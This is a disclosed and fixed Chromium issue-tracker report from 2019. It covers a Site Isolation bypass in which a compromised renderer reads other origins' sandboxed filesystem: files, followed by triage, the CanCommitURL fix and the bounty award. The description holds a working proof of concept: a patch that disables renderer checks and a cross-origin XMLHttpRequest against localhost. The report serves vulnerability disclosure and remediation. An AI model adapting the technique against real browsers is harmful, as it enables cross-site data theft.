# Site Isolation breaking bug in filesystem

| Field | Value |
|-------|-------|
| **Issue ID** | [40095069](https://issues.chromium.org/issues/40095069) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>Storage>FileSystem, Internals>Sandbox>SiteIsolation |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, iOS, ChromeOS |
| **Reporter** | wy...@gmail.com |
| **Assignee** | al...@chromium.org |
| **Created** | 2019-05-17 |
| **Bounty** | $5,000.00 |

## Description

UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36

Steps to reproduce the problem:
I find that the javascript code under domain A can access the filesystem data under domain B, and the only one check exists in the renderer process, there is no check in browser process.
So compromised renderer can steal files of filesystem under other sites. Then the Site Isolation security policy is broken.

1、Patch #BaseFetchContext::CanRequestInternal# of //src/third_party/blink/renderer/core/loader/base_fetch_context.cc
 as:

base::Optional<ResourceRequestBlockedReason>
BaseFetchContext::CanRequestInternal(
    ResourceType type,
    const ResourceRequest& resource_request,
    const KURL& url,
    const ResourceLoaderOptions& options,
    SecurityViolationReportingPolicy reporting_policy,
    ResourceRequest::RedirectStatus redirect_status) const {
  return base::nullopt;
  //...
}

2、Compile Chromium.

3、Prepare filesystem file under http://127.0.0.1:7878/filesystem.html

<html>
<script>
window.requestFileSystem  = window.requestFileSystem || window.webkitRequestFileSystem;

function errorHandler(e) {
  console.log('Error');
}

function onInitFs_write(fs) {
    fs.root.getFile('log.txt', {create: true}, function(fileEntry) {
    	fileEntry.createWriter(function(fileWriter) {

      		fileWriter.onwriteend = function(e) {
        		console.log('Write completed.');
      		};

      		fileWriter.onerror = function(e) {
        		console.log('Write failed: ' + e.toString());
      		};

      		var blob = new Blob(["112233"]);
            fileWriter.write(blob);
    	}, errorHandler);

    }, errorHandler);
}

window.requestFileSystem(window.TEMPORARY, 1024*1024, onInitFs_write, errorHandler);
</script>
</html>

4、Load the test.html file under http://127.0.0.1:7979/test.html (or you can test it under other different sites from http://127.0.0.1:7878)

<html>
<script>
alert(1);
var x = new XMLHttpRequest();

x.onload = function() {
    alert(this.status);
    if (this.readyState == 4 && this.status == 200) {
        alert(x.responseText);
    }
};

x.open("GET", "filesystem:http://127.0.0.1:7878/temporary/log.txt", true);

x.send();
</script>
</html>

Then you will find we can get the data of log.txt under http://127.0.0.1:7878 from http://127.0.0.1:7979.

What is the expected behavior?

What went wrong?
The filesystem code in browser process doesn't do the cross site enforcing sufficiently.

The call graph is #FileSystemURLLoaderFactory::CreateLoaderAndStart# -> #FileSystemFileURLLoader::CreateAndStart# -> #FileSystemEntryURLLoader::Start# -> #FileSystemEntryURLLoader::StartOnIOThread# 

In #FileSystemEntryURLLoader::StartOnIOThread#:
void StartOnIOThread(const network::ResourceRequest& request,
                       network::mojom::URLLoaderRequest loader,
                       network::mojom::URLLoaderClientPtrInfo client_info) {
	//...
	if (params_.render_process_host_id != ChildProcessHost::kInvalidUniqueID &&
        	!ChildProcessSecurityPolicyImpl::GetInstance()->CanRequestURL(
            		params_.render_process_host_id, request.url)) {
      	    DVLOG(1) << "Denied unauthorized request for "
               << request.url.possibly_invalid_spec();
            OnClientComplete(net::ERR_INVALID_URL);
            return;
        }
	//...
}

And the check in #CanRequestURL# is not enough.

//src/content/browser/child_process_security_policy_impl.cc
bool ChildProcessSecurityPolicyImpl::CanRequestURL(
	//...

	if (url.SchemeIsBlob() || url.SchemeIsFileSystem()) {
    		if (IsMalformedBlobUrl(url))
      			return false;

    		url::Origin origin = url::Origin::Create(url);
    		return origin.opaque() || CanRequestURL(child_id, GURL(origin.Serialize()));
  	}

  	if (IsWebSafeScheme(scheme))
    		return true;
	//...
}

For our requested url filesystem:http://127.0.0.1:7878/temporary/log.txt, #CanRequestURL# will return true.

Did this work before? N/A 

Chrome version: 74.0.3729.157  Channel: stable
OS Version: 10.0
Flash Version:

## Timeline

### mp...@google.com (2019-05-17)

Very nice. I was able to reproduce this on the most recent commit. Alexmos@ I'll assign this to you as you made some edits in https://chromium-review.googlesource.com/c/chromium/src/+/1235343/ to change CanCommitURL... Perhaps similar checks need to be added to CanRequestURL?

Presumably this can only be used to view files in other sites' filesystems, so I'll mark this as medium. Site isolators, feel free to modify the severity.

[Monorail components: Internals>Sandbox>SiteIsolation]

### lu...@chromium.org (2019-05-17)

mek@, is this a duplicate of https://crbug.com/chromium/917457?

[Monorail components: Blink>Storage>FileSystem]

### me...@chromium.org (2019-05-17)

no, that's a different issue (although I suppose similar effect). That issue lets compromised renderers request the mojo interface to interact with other origin's sandboxed file systems.

In this bug the problem is that FileSystemURLLoaderFactory (and the pre-network-service equivalent of that code in FileSystemProtocolHandler) don't check the origin of the requester against the origin of the URL being requested. That combined with URLs of sandboxed filesystem being fully predictable means that any renderer that can bypass the renderer side checks can indeed access cross origin sandboxed filesystem resources like that.

(I'm a bit surprised that CORS or something like that isn't blocking the contents here though, since without CORS headers this would still be a cross origin subresource load that shouldn't be allowed no matter the schemes, but I guess CORS isn't really a thing for anything other than http/https since it doesn't make sense for them)

### sh...@chromium.org (2019-05-18)

Setting milestone and target because of Security_Impact=Stable and medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2019-05-18)

Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### al...@chromium.org (2019-05-24)

Sorry that I haven't been able to look into this or try to repro yet.  I doubt we can tighten CanRequestURL the same way as CanCommitURL, as we don't want to prevent pages from requesting legitimate cross-site subresources like images in general.  However, I'm curious if we can change the check in FileSystemEntryURLLoader::StartOnIOThread to use CanCommitURL instead of CanRequestURL.  We already use the stronger CanCommitURL in other filesystem checks (see ChildProcessSecurityPolicyImpl::HasPermissionsForFileSystemFile).  mek@: is it true that a page should never request filesystem resources (e.g., images) belonging to another site? 

Re: other checks not catching this -- those might be too late anyway if they apply after the content reaches the compromised renderer.  It would be nice if CORB blocked this, though, but lukasza@ points out that CORB only works for network requests, whereas here the request is handled in the browser process by FileSystemURLLoaderFactory.  Maybe we could consider extending CORB to deal with more of these cases.

### me...@chromium.org (2019-05-28)

I think it is indeed correct that a page should never request cross-origin filesystem subresources. Although this all being non-standard means there is no spec, and thus it really comes down to whatever chromes current behavior is. I'm not entirely sure where/how renderer side checks are currently enforcing same origin requirements here, but it seems totally reasonable/correct to me to block all cross origin subresource requests to filesystem: URLs.

### al...@chromium.org (2019-06-01)

Status update: I tried the straightforward CanRequestURL->CanCommitURL (or CanAccessDataForOrigin) tightening in FileSystemEntryURLLoader::StartOnIOThread (see https://crrev.com/c/1635876), and that mostly worked except for one test: ProcessManagerBrowserTest.NestedURLDownloadsToExtensionAllowed.  That test creates a filesystem extension URL (from a live extension frame), then injects that URL into an <a download href='url'> tag in a web frame.  It expects that clicking on that link will let the download complete.  Normally, we block web frames from being able to navigate to extension URLs, but we apparently relax our security checks to allow downloads to go through in that case -- see issues 798705 and 802011.  

I'm curious if this exception to the cross-origin filesystem URL access is specific to extensions, downloads, or both.  +jochen@ (who fixed https://crbug.com/chromium/802011), +devlin@, mek@ - any thoughts?

lukasza@ pointed out that it might be reasonable for content scripts to inject blob:/filesystem: URLs generated by an extension into web content and expect it to work, so we probably do want to exclude extensions from the tightening here?  (Haven't thought about how to do that yet - the network service doesn't know about extensions, but ChildProcessSecurityPolicy kind of does, via RegisterWebSafeIsolatedScheme.)

### al...@chromium.org (2019-06-03)

lukasza@ and I have just discussed that issues 798705, 801586, and 802011 appear to involve downloads of blob URLs only, not filesystem URLs.  So maybe it's ok to lock the downloads down for all filesystem URLs but leave them working for blob URLs.  This seems to make sense: filesystem URLs are more dangerous since they can be guessed, and it doesn't seem like a good idea if an arbitrary web renderer can start downloading an extension's filesystem resources just by guessing the URL.  OTOH, for blob URLs the web renderer needs to have received the URL with the UUID before it can request a download.

So, given this, I'd propose to lock down any cross-origin filesystem URL access, even for extensions/downloads, and update the test in https://crbug.com/chromium/964245#c8 to only consider extension downloads from blob URLs.  We can see if we can get away with this, and if not, we can figure out how to relax this.  Devlin/jochen@: let me know if that sounds reasonable.

### me...@chromium.org (2019-06-03)

That certainly sounds reasonable to me.

### jo...@chromium.org (2019-06-03)

yeah, locking down sounds reasonable

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-06-07)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/d8fb84f4bb703bd314c62be2bfbe876330bea1d3

commit d8fb84f4bb703bd314c62be2bfbe876330bea1d3
Author: Alex Moshchuk <alexmos@chromium.org>
Date: Fri Jun 07 22:53:55 2019

Tighten filesystem: requests to use stronger CanCommitURL security checks.

This CL strenthens security checks in FileSystemEntryURLLoader to
block requests for filesystem: URLs if the requested URL is not
commitable in the current process.  When site isolation is on, this
will prevent one origin from fetching filesystem resources belonging
to another origin.

Note that this will also block web sites from requesting arbitrary
extension filesystem URLs that lead to downloads, which is an
intentional change discussed on 964245.  An existing test in
ProcessManagerBrowserTest is updated accordingly.

Bug: 964245
Change-Id: I09023cc884278efef0bb4d16e584b2c5f1a5fd5b
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1635876
Reviewed-by: Łukasz Anforowicz <lukasza@chromium.org>
Reviewed-by: Marijn Kruisselbrink <mek@chromium.org>
Reviewed-by: Devlin <rdevlin.cronin@chromium.org>
Commit-Queue: Alex Moshchuk <alexmos@chromium.org>
Cr-Commit-Position: refs/heads/master@{#667356}

[modify] https://crrev.com/d8fb84f4bb703bd314c62be2bfbe876330bea1d3/chrome/browser/extensions/process_manager_browsertest.cc
[modify] https://crrev.com/d8fb84f4bb703bd314c62be2bfbe876330bea1d3/content/browser/fileapi/file_system_url_loader_factory.cc
[modify] https://crrev.com/d8fb84f4bb703bd314c62be2bfbe876330bea1d3/content/browser/fileapi/file_system_url_loader_factory_browsertest.cc


### al...@chromium.org (2019-06-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-06-11)

[Empty comment from Monorail migration]

### al...@chromium.org (2019-06-12)

Note: after my fix in https://crbug.com/chromium/964245#c12, apparently an extensions filesystem download test became flaky -- I'll investigate that in https://crbug.com/chromium/973271.

### na...@google.com (2019-06-17)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-06-18)

Requesting merge to M76 because latest trunk commit (667356) appears to be after beta branch point (665002).

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2019-06-18)

This bug requires manual review: M76 has already been promoted to the beta branch, so this requires manual review
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://goto.google.com/chrome-release-branch-merge-guidelines
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on master/ToT?
4. Why are these changes required in this milestone after branch?
5. Is this a new feature?
6. If it is a new feature, is it behind a flag using finch?

Please contact the milestone owner if you have questions.
Owners: govind@(Android), kariahda@(iOS), cindyb@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ab...@google.com (2019-06-18)

branch:3809

### go...@chromium.org (2019-06-18)

Pleas merge your change to M76 branch 3809 latest by 1:00 PM PT today so we can pick it up for tomorrow's beta release. Thank you.


### al...@chromium.org (2019-06-18)

I've done the merge in https://chromium.googlesource.com/chromium/src/+/2d5c4453466296b4dedbaa7af6aaac0761a3f40d, not sure why bugdroid didn't post a comment.  

### cr...@appspot.gserviceaccount.com (2019-06-19)

The following revision refers to this bug: 
https://chromium.googlesource.com/chromium/src.git/+/2d5c4453466296b4dedbaa7af6aaac0761a3f40d

Commit: 2d5c4453466296b4dedbaa7af6aaac0761a3f40d
Author: alexmos@chromium.org
Commiter: alexmos@chromium.org
Date: 2019-06-18 21:00:39 +0000 UTC

[Merge to M76] Tighten filesystem: requests to use stronger CanCommitURL security checks.

This CL strenthens security checks in FileSystemEntryURLLoader to
block requests for filesystem: URLs if the requested URL is not
commitable in the current process.  When site isolation is on, this
will prevent one origin from fetching filesystem resources belonging
to another origin.

Note that this will also block web sites from requesting arbitrary
extension filesystem URLs that lead to downloads, which is an
intentional change discussed on 964245.  An existing test in
ProcessManagerBrowserTest is updated accordingly.

TBR=alexmos@chromium.org

(cherry picked from commit d8fb84f4bb703bd314c62be2bfbe876330bea1d3)

Bug: 964245
Change-Id: I09023cc884278efef0bb4d16e584b2c5f1a5fd5b
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1635876
Reviewed-by: Łukasz Anforowicz <lukasza@chromium.org>
Reviewed-by: Marijn Kruisselbrink <mek@chromium.org>
Reviewed-by: Devlin <rdevlin.cronin@chromium.org>
Commit-Queue: Alex Moshchuk <alexmos@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#667356}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1665556
Reviewed-by: Alex Moshchuk <alexmos@chromium.org>
Cr-Commit-Position: refs/branch-heads/3809@{#435}
Cr-Branched-From: d82dec1a818f378c464ba307ddd9c92133eac355-refs/heads/master@{#665002}


### al...@chromium.org (2019-06-19)

[Empty comment from Monorail migration]

### na...@google.com (2019-06-20)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### na...@google.com (2019-06-20)

Congrats! The Panel decided to reward $5,000 for this reward. 

### na...@google.com (2019-06-20)

[Empty comment from Monorail migration]

### ad...@google.com (2019-07-29)

[Empty comment from Monorail migration]

### ad...@chromium.org (2019-07-30)

[Empty comment from Monorail migration]

### wy...@gmail.com (2019-07-31)

Hello, and sorry to disturb you.
Would you please modify the ackownleage info to "Yongke Wang of Tencent Security Xuanwu Lab (xlab.tencent.com)" for this and subsequent bugs?
Thx. 

### sh...@chromium.org (2019-09-17)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ad...@chromium.org (2019-11-23)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-08)

This issue was migrated from crbug.com/chromium/964245?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink>Storage>FileSystem, Internals>Sandbox>SiteIsolation]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40095069)*
